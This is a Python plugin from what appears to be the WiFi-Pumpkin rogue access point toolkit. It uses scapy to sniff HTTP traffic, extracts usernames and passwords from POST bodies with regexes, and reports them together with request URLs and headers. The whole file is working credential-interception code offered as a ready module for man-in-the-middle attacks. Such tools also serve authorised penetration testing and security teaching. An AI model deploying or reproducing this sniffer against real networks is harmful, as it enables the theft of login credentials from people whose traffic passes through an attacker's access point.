from scapy.all import *
from scapy_http import http
from default import PSniffer

"""
Description:
    This program is a core for modules wifi-pumpkin.py. file which includes all Implementation
    plugin TCPproxy for capture http creds and url.

Copyright:
    Copyright (C) 2015-2017 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class MonitorCreds(PSniffer):
    _activated     = False
    _instance      = None
    meta = {
        'Name'      : 'httpCap',
        'Version'   : '1.0',
        'Description' : 'capture urls and creds realtime http requests',
        'Author'    : 'Pumpkin-Dev',
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if MonitorCreds._instance is None:
            MonitorCreds._instance = MonitorCreds()
        return MonitorCreds._instance

    def getCredentials_POST(self,payload,url,header,dport,sport):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        if not username ==[] and not password == []:
            self.output.emit({'POSTCreds':{'User':username[0][1],
            'Pass': password[0][1],'Url':str(url),'Destination':'{}/{}'.format(sport,dport)}})

    def get_http_POST(self,load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split('\r\n')
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if 'Referer:' in dict_head.keys():
                return dict_head ,dict_head['Referer:']
        except ValueError:
            return None,None
        return dict_head, None


    def filterPackets(self,pkt):
        if not pkt.haslayer(http.HTTPRequest):
            return
        try:
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.dport = pkt[TCP].dport
                self.sport = pkt[TCP].sport
                self.src_ip_port = str(pkt[IP].src) + ':' + str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst) + ':' + str(self.dport)

            http_layer = pkt.getlayer(http.HTTPRequest)
            ip_layer = pkt.getlayer(IP)

            if http_layer.fields['Method'] == 'POST':
                self.getCredentials_POST(pkt.getlayer(Raw).load, http_layer.fields['Host'],
                http_layer.fields['Headers'], self.dst_ip_port, self.src_ip_port)

            return self.output.emit({'urlsCap':{'IP': ip_layer.fields, 'Headers': http_layer.fields}})
        except: pass


    def random_char(self,y):
           return ''.join(random.choice(string.ascii_letters) for x in range(y))
